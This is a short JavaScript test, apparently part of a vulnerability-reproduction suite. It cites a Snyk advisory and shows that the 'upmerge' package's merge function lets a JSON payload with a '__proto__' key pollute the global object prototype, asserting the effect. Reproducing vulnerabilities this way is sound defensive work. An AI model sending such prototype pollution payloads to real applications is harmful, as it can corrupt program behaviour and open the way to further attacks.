//https://snyk.io/vuln/SNYK-JS-UPMERGE-174133
test("prototype pollution in upmerge", () => {
    
    let upmerge = require('upmerge'); // this version is vulnerable
    let payload = '{"__proto__":{ "polluted" : "yes" } }'; // this comes from network
    obj = {}

    expect({}.polluted).toBe(undefined);
    
    upmerge.merge({}, JSON.parse(payload));
    expect({}.polluted).toBe("yes");
  });
  